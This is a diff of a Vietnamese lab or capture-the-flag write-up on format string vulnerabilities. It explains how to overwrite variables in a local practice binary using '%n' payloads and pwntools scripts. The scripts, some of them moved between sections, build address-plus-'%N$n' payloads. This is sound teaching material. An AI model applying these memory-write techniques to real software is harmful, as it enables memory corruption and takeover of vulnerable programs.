@@ -136,31 +136,13 @@ for_c()
 > Tip: Trong trường hợp địa chỉ muốn ghi đè chứa các byte đặc biệt, ta có thể cân nhắc chuyển địa chỉ ghi đè về cuối payload.
 
 ## Câu 5
-- Để ghi đè biến `a` thành `2`, ta cần đặt địa chỉ ghi đè về cuối payload vì địa chỉ chiếm 4 bytes nên `%n` sẽ luôn trả về giá trị >= 4.
+- Để ghi đè biến `a` thành `2`, ta cần đặt địa chỉ ghi đè về cuối payload vì địa chỉ chiếm 4 bytes nên `%n` sẽ luôn trả về giá trị >= 4. Lúc này vì phần đầu payload là `aa%6$n` là 6 byte nên địa chỉ của `a` sẽ không align để ta có thể truy xuất bình thường nên ta sẽ thêm padding 2 byte `aa` vào cuối đoạn đầu này.
+- Lúc này địa chỉ của `a` sẽ được đẩy về sau 8 byte, tương đương lùi 2 vị trí đối số. Do đó t thay `%6$n` thành `%8$n`.
 - Script exploit:  
 
 ```python
-```
-
-## Câu 6
-```python
 from pwn import *
 
-
-def for_c():
-    sh = process('./overwrite')
-    c_addr = int(sh.recvuntil('\n', drop=True), 16)
-    print(hex(c_addr))
-
-    payload = p32(c_addr) + b'%012d' + b'%6$n'
-    print(payload)
-
-    with open('payload.in', 'wb') as f:
-        f.write(payload)
-
-    sh.sendline(payload)
-    print(sh.recv())
-    sh.interactive()
 
 def for_a():
     sh = process('./overwrite')
@@ -170,6 +152,19 @@ def for_a():
     sh.sendline(payload)
     print(sh.recv())
     sh.interactive()
+
+for_a()
+```
+
+- Chạy script:  
+
+![image](https://user-images.githubusercontent.com/44528004/143335107-4402db51-7ec5-4ef6-a965-59cf25ffedde.png)
+
+
+## Câu 6
+```python
+from pwn import *
+
 
 def for_b():
     sh = process('./overwrite')
